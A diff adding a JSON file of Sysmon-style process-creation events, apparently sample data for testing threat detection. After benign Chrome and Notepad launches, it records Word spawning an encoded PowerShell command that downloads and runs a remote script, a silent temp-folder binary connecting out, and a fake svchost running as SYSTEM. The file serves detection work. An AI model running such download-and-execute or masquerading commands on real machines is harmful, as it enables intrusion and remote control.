@@ -1,0 +1,83 @@
+[
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 09:00:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 09:01:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 09:02:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 09:05:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\Documents\\meeting_notes.txt"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 09:06:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe C:\\Users\\alice\\Documents\\todo.txt"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 09:07:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 10:15:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 10:20:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "CORP\\alice",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Image": "C:\\Users\\alice\\AppData\\Local\\Temp\\updater_x64.exe",
+    "CommandLine": "C:\\Users\\alice\\AppData\\Local\\Temp\\updater_x64.exe --silent --connect 198.51.100.4"
+  },
+  {
+    "EventID": "1",
+    "UtcTime": "2026-11-18 10:25:00.000",
+    "Computer": "WORKSTATION01",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Image": "C:\\Users\\alice\\AppData\\Local\\svchost.exe",
+    "CommandLine": "C:\\Users\\alice\\AppData\\Local\\svchost.exe -k netsvcs"
+  }
+]
